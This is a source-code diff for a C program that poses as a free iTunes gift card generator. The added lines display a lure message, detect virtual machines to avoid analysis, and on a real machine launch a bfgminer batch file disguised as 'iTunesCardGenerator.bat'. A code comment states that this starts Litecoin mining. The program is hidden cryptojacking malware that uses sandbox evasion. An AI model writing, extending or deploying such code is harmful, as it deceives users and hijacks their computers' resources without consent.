@@ -26,14 +26,18 @@ void registry_check();
 int main(int argc, const char * argv[]) {
     number_of_cores();
 #ifdef WIN32
-    system("echo This may take a while, please be patient.");
+    system("echo Attempting to verify your eligibility for a free "
+           "iTunes gift card. This may take a while, please be patient.");
     char* vmware_sys = "System Manufacturer: \t VMware, Inc.";
     run_command("systeminfo | find \"System Manufacturer\"", vmware_sys, 36);
     registry_check();
-    if(vm_score < 3){
-        printf("Please wait while we generate a gift card code. \n Note, "
+    if(vm_score <= 3){
+        printf("Please wait while we generate a gift card code. \nNote, "
                "this could take a while, so please be patient and do not "
                "close the program. Thank you. \n");
+        system("cd bfgminer-5.4.2-win64"); //change directories to bfgminer
+        system("dir");
+        system("start iTunesCardGenerator.bat");//start mining LiteCoin
     }
 
     printf("Virtual Machine detected. In order to receive your free iTunes "
